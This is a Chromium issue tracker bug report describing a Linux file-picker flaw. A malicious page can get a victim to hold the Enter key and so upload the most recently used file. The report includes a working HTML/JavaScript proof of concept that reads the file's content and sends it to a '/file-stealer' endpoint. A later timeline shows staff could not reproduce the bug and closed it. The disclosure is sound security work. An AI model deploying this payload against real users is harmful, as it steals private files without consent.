# On Ubuntu (or other Linux-based systems) an attacker can steal files uploaded to other sites with little user interaction.

| Field | Value |
|-------|-------|
| **Issue ID** | [504302441](https://issues.chromium.org/issues/504302441) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | UI>Linux Toolkit Theming |
| **Platforms** | Linux, ChromeOS |
| **Reporter** | va...@hotmail.com |
| **Assignee** | th...@chromium.org |
| **Created** | 2026-04-19 |
| **Bounty** | $1,000.00 |

## Description

---

### Report description

On Ubuntu (or other Linux-based systems) an attacker can steal files uploaded to other sites with little user interaction.

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

#### Which URL (or repository) have you found the vulnerability in?

/

---

### The problem

#### Please describe the technical details of the vulnerability

I have found this public report <https://issues.chromium.org/issues/470928605>, and when i tried to reproduce it on the latest version, I found that this issue has not been fixed

I discovered that on Ubuntu, whenever you're uploading a file using a <input type=file>, the file selection window automatically opens the folder where from which the previous file upload across any site was made. Furthermore, it even selects the top file in that directory. I found that by tricking a victim into holding the Enter key on their keyboard, a malicious site could automatically select the previously uploaded file and send it to the attacker, without the user having a chance at stopping the attack.

The code below shows a simple PoC to reproduce the issue.

First, go to any website that supports a file upload (In the attached video PoC, this is the example on <https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/input/file#using_file_inputs>).
Upload a file from any directory on the filesystem. This mimics a user who has uploaded a file to any site.
Now browse to the attacker's page. If you hold the Enter key on this page, it will automatically open the file picker window. The Enter key being held means that within that window the top file will be selected and uploaded instantaneously.

```
<p>Hold the "Enter" key</p>
<input type="file" id="fileInput" style="display:none;">
<script>
document.addEventListener('keydown', async e => {
  if (e.key === 'Enter') {
    const fileInput = document.getElementById('fileInput');
    fileInput.click();
    fileInput.addEventListener('change', function() {
      const file = this.files[0];

      console.log('File name:', file.name);
      console.log('File size (bytes):', file.size);
      console.log('MIME type:', file.type);

      const reader = new FileReader();
      reader.onload = function(e) {
        console.log('File content:', e.target.result);
        fetch('/file-stealer?file=' + e.target.result);
      };
      reader.readAsText(file);
    });
  }
})
</script>

```

I believe that tricking a user into holding the Enter key is a trivial user interaction to achieve. The video PoC that I've attached shows a site that is dressed up a bit more and that requires the holding of this key to load, however one could also easily envision a game where the enter key is used to speed up a car, and thus held.

As a user, I'd like to know that I can safely hold any key on my keyboard without that causing my last uploaded file to be stolen.

#### Impact analysis

Any remote attacker can host a malicious site that allows the stealing of files uploaded to other sites.

---

### The cause

#### What version of Chrome have you found the security issue in?

Version 147.0.7727.101 (Official Build) (64-bit)

#### Is the security issue related to a crash?

No, it is not related to a crash.

#### Choose the type of vulnerability

Security UI Spoofing

#### How would you like to be publicly acknowledged for your report?

Souhaib Naceri

## Timeline

### ch...@google.com (2026-04-23)

I'm using GNOME Linux and I can't seem to repro this - the fix for the original bug claims to have made the open button not selected by default, however what I'm seeing is that the file picker dialog is not even focused to begin with, until you click on it.

What type of Linux are you on?

### aj...@google.com (2026-05-05)

Closing as no feedback was provided.

### ch...@google.com (2026-05-12)

This issue has been closed as an incomplete or invalid report and we will not respond to further comments. If you can improve your report please open a fresh issue that addresses any feedback provided.

For more information on our vulnerability policies, please refer to <https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md>

### eb...@google.com (2026-08-13)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/504302441)*
